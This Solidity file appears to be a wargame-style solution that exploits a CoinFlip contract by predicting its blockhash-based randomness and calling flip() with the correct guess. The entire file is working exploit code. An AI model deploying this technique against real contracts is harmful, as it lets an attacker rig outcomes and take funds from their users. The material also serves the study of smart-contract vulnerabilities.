// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        // using victim contract address
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // we basically used the same functionality from victim contract. if we can predict random generation, then we can figure out the answer
        // broke the rule of randomness. reference: https://solidity-by-example.org/hacks/randomness
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(contractAddress).flip(side);
    }
}
